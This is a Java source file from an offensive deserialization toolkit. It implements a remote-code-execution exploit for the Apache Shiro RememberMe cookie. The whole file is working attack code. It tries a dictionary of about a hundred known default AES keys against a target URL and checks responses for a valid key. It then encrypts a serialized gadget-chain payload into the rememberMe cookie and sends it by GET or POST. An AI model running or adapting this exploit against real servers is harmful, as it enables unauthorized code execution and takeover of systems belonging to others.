package ysomap.exploits.shiro;

import okhttp3.Headers;
import okhttp3.MediaType;
import okhttp3.RequestBody;
import okhttp3.Response;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;
import ysomap.common.util.Status;
import ysomap.common.util.Strings;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.CipherHelper;
import ysomap.core.util.HTTPHelper;
import ysomap.core.util.PayloadHelper;
import ysomap.exploits.AbstractExploit;
import ysomap.payloads.Payload;

import java.security.SecureRandom;
import java.util.List;

/**
 * TODO 对于echo类型，cookie的长度有限制 需要解决这个问题
 * @author wh1t3P1g
 * @since 2020/4/1
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {
        "CommonsBeanutils1",
        "CommonsCollections9",
        "RMIConnectWithUnicastRemoteObject", // 发起RMI连接
        "URLDNS",
        "JNDIRefWrapper",
        "RMIConnectWrapped",
        "RMIConnectWrappedWithProxy"
}, param = false)
@Details("Shiro框架RememberMe Cookie反序列化攻击包。\n" +
        "需要设置一个指定的payload，通常优先需使用CommonsBeanutils1或CommonsCollections9。")
public class ShiroRCE1 extends AbstractExploit {

    @Require(name = "key", detail = "设置shiro AES Key，如果为空，则使用默认key列表")
    public String key = null;

    @NotNull
    @Require(name = "target", detail = "目标url")
    public String target = null;

    @NotNull
    @Require(name = "requestMethod", detail = "GET or POST, default GET")
    public String requestMethod = "GET";

    @NotNull
    @Require(name = "postData", detail = "POST类型时，可填充特殊的post data")
    public String postData = "test=test";

    @NotNull
    @Require(name = "force", type="boolean", detail = "强制轮询默认的key列表")
    public String force = "false";

    @NotNull
    public Payload payload;
    public String payloadName;

    @Override
    public void work() {
        boolean isNeedVerify = "false".equals(force);

        if(key == null){
            boolean flag = false;
            for(String current: DEFAULT_KEYS){
                if(isNeedVerify && verifyKey(current)){
                    Logger.success("Found Shiro Key: "+current);
                    flag = true;
                    key = current;
                    exploit(current);// 找到key，并攻击
                    break;
                }else if(!isNeedVerify){ // 对每一种默认的key尝试进行攻击
                    exploit(current);
                }
            }
            if(!flag){
                Logger.error("Shiro Key Not Found!");
            }
            Logger.normal("Finished");
        }else{
            if(verifyKey(key)){
                Logger.normal("Try to use provided Key: "+key);
                exploit(key);
            }else{
                Logger.error(String.format("Key %s is wrong!", key));
            }
        }
    }

    @Override
    public void stop() {
        status = Status.STOPPED;
    }

    public boolean verifyKey(String key){
        try{
            String encrypted = doEncrypt(key, PayloadHelper.makeSimplePrincipalCollection());
            Response response = send(encrypted);
            Logger.success("Try to verify key. Current key: "+key);
            Logger.success("Response: "+response.toString());
            Headers headers = response.headers();
            response.close();
            List<String> cookies = headers.values("Set-Cookie");
            for(String cookie:cookies){
                if(cookie.contains("rememberMe=deleteMe")){
                    return false;
                }
            }
            // 暂时仅对不存在deleteMe，且status code==200的包进行key的确认
            // 所以对于其他类型，比如仅能使用post的接口，不要使用这种方式
            // 可以采用强制模式，直接每一种key进行轮询
            if(response.code() == 200){
                return true;
            }
        }catch (Exception e){
            // something wrong
        }
        return false;
    }

    public void exploit(String key){
        try{
            String encrypted = doEncrypt(key, payload);
            Response response = send(encrypted);
            response.close();
            Logger.normal("Try to exploit using key "+key);
            Logger.normal("Response: "+response);
        } catch (Exception e) {
        }
    }

    public String doEncrypt(String key, Object obj) throws Exception {
        byte[] plainBytes = null;
        if(obj instanceof Payload){
            plainBytes = (byte[]) SerializerFactory.createSerializer("default").serialize((Payload) obj);
        }else{
            plainBytes = (byte[]) SerializerFactory.createSerializer("default").serialize(obj);
        }
        int ivSize = 16;
        byte[] ivBytes = new byte[ivSize];
        SecureRandom random = new SecureRandom();
        random.nextBytes(ivBytes);
        byte[] keyBytes = Strings.base64(key.getBytes());
        byte[] encrypted = CipherHelper.encrypt(plainBytes, keyBytes, ivBytes);
        if(encrypted != null){
            byte[] packed = new byte[ivSize + encrypted.length];
            System.arraycopy(ivBytes, 0, packed, 0, ivSize);
            System.arraycopy(encrypted, 0, packed, ivSize, encrypted.length);
            return Strings.base64ToString(packed);
        }
        return null;
    }

    public Response send(String cookie){
        cookie = "rememberMe="+cookie;
        Headers headers = new Headers.Builder().add("Cookie", cookie).build();
        if("POST".equals(requestMethod)){
            MediaType MEDIA_TYPE = MediaType.parse("text/text; charset=utf-8");
            RequestBody body = RequestBody.create(MEDIA_TYPE, postData+"&time="+System.currentTimeMillis());
            return HTTPHelper.post(target, body, headers, false);
        }else{
            return HTTPHelper.get(target, headers, false);
        }
    }

    private static String[] DEFAULT_KEYS = {
            "kPH+bIxk5D2deZiIxcaaaA==",
            "0AvVhmFLUs0KTA3Kprsdag==",
            "1AvVhdsgUs0FSA3SDFAdag==",
            "1QWLxg+NYmxraMoxAXu/Iw==",
            "1tC/xrDYs8ey+sa3emtiYw==",
            "25BsmdYwjnfcWmnhAciDDg==",
            "2A2V+RFLUs+eTA3Kpr+dag==",
            "2AvVhdsgUs0FSA3SDFAdag==",
            "2cVtiE83c4lIrELJwKGJUw==",
            "2itfW92XazYRi5ltW0M2yA==",
            "3AvVhmFLUs0KTA3Kprsdag==",
            "3JvYhmBLUs0ETA5Kprsdag==",
            "3qDVdLawoIr1xFd6ietnwg==",
            "4AvVhmFLUs0KTA3Kprsdag==",
            "4BvVhmFLUs0KTA3Kprsdag==",
            "5AvVhmFLUS0ATA4Kprsdag==",
            "5AvVhmFLUs0KTA3Kprsdag==",
            "5J7bIJIV0LQSN3c9LPitBQ==",
            "5aaC5qKm5oqA5pyvAAAAAA==",
            "66v1O8keKNV3TTcGPK1wzg==",
            "6AvVhmFLUs0KTA3Kprsdag==",
            "6NfXkC7YVCV5DASIrEm1Rg==",
            "6Zm+6I2j5Y+R5aS+5ZOlAA==",
            "6ZmI6I2j3Y+R1aSn5BOlAA==",
            "6ZmI6I2j5Y+R5aSn5ZOlAA==",
            "7AvVhmFLUs0KTA3Kprsdag==",
            "8AvVhmFLUs0KTA3Kprsdag==",
            "8BvVhmFLUs0KTA3Kprsdag==",
            "9AvVhmFLUs0KTA3Kprsdag==",
            "9FvVhtFLUs0KnA3Kprsdyg==",
            "A7UzJgh1+EWj5oBFi+mSgw==",
            "Bf7MfkNR0axGGptozrebag==",
            "ClLk69oNcA3m+s0jIMIkpg==",
            "CrownKey==a12d/dakdad",
            "GAevYnznvgNCURavBhCr1w==",
            "HWrBltGvEZc14h9VpMvZWw==",
            "IduElDUpDDXE677ZkhhKnQ==",
            "Is9zJ3pzNh2cgTHB4ua3+Q==",
            "Jt3C93kMR9D5e8QzwfsiMw==",
            "L7RioUULEFhRyxM7a2R/Yg==",
            "MPdCMZ9urzEA50JDlDYYDg==",
            "MTIzNDU2Nzg5MGFiY2RlZg==",
            "MTIzNDU2NzgxMjM0NTY3OA==",
            "MzVeSkYyWTI2OFVLZjRzZg==",
            "NGk/3cQ6F5/UNPRh8LpMIg==",
            "NsZXjXVklWPZwOfkvk6kUA==",
            "O4pdf+7e+mZe8NyxMTPJmQ==",
            "OUHYQzxQ/W9e/UjiAGu6rg==",
            "OY//C4rhfwNxCQAQCrQQ1Q==",
            "Q01TX0JGTFlLRVlfMjAxOQ==",
            "SDKOLKn2J1j/2BHjeZwAoQ==",
            "SkZpbmFsQmxhZGUAAAAAAA==",
            "U3BAbW5nQmxhZGUAAAAAAA==",
            "U3ByaW5nQmxhZGUAAAAAAA==",
            "V2hhdCBUaGUgSGVsbAAAAA==",
            "WcfHGU25gNnTxTlmJMeSpw==",
            "WuB+y2gcHRnY2Lg9+Aqmqg==",
            "XTx6CKLo/SdSgub+OPHSrw==",
            "XgGkgqGqYrix9lI6vxcrRw==",
            "Y1JxNSPXVwMkyvES/kJGeQ==",
            "YI1+nBV//m7ELrIyDHm6DQ==",
            "YTM0NZomIzI2OTsmIzM0NTueYQ==",
            "Z3VucwAAAAAAAAAAAAAAAA==",
            "Z3h6eWd4enklMjElMjElMjE=",
            "ZAvph3dsQs0FSL3SDFAdag==",
            "ZUdsaGJuSmxibVI2ZHc9PQ==",
            "ZWvohmPdUsAWT3=KpPqda",
            "ZmFsYWRvLnh5ei5zaGlybw==",
            "ZnJlc2h6Y24xMjM0NTY3OA==",
            "a2VlcE9uR29pbmdBbmRGaQ==",
            "a3dvbmcAAAAAAAAAAAAAAA==",
            "aU1pcmFjbGVpTWlyYWNsZQ==",
            "bWljcm9zAAAAAAAAAAAAAA==",
            "bWluZS1hc3NldC1rZXk6QQ==",
            "bXRvbnMAAAAAAAAAAAAAAA==",
            "bya2HkYo57u6fWh5theAWw==",
            "c+3hFGPjbgzGdrC+MHgoRQ==",
            "c2hpcm9fYmF0aXMzMgAAAA==",
            "cGhyYWNrY3RmREUhfiMkZA==",
            "cGljYXMAAAAAAAAAAAAAAA==",
            "cmVtZW1iZXJNZQAAAAAAAA==",
            "d2ViUmVtZW1iZXJNZUtleQ==",
            "empodDEyMwAAAAAAAAAAAA==",
            "ertVhmFLUs0KTA3Kprsdag==",
            "f/SY5TIve5WWzT4aQlABJA==",
            "fCq+/xW488hMTCD+cmJ3aQ==",
            "fsHspZw/92PrS3XrPW+vxw==",
            "hBlzKg78ajaZuTE0VLzDDg==",
            "i45FVt72K2kLgvFrJtoZRw==",
            "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
            "lT2UvDUmQwewm6mMoiw4Ig==",
            "r0e3c16IdVkouZgk1TKVMg==",
            "rPNqM6uKFCyaL10AK51UkQ==",
            "s0KTA3mFLUprK4AvVhsdag==",
            "sHdIjUN6tzhl8xZMG3ULCQ==",
            "vXP33AonIp9bFwGl7aT7rA==",
            "wGiHplamyXlVB11UXWol8g==",
            "xVmmoltfpb8tTceuT5R7Bw==",
            "yNeUgSzL/CfiWw1GALg6Ag==",
            "yeAAo1E8BOeAYfBlm4NG9Q=="};
}
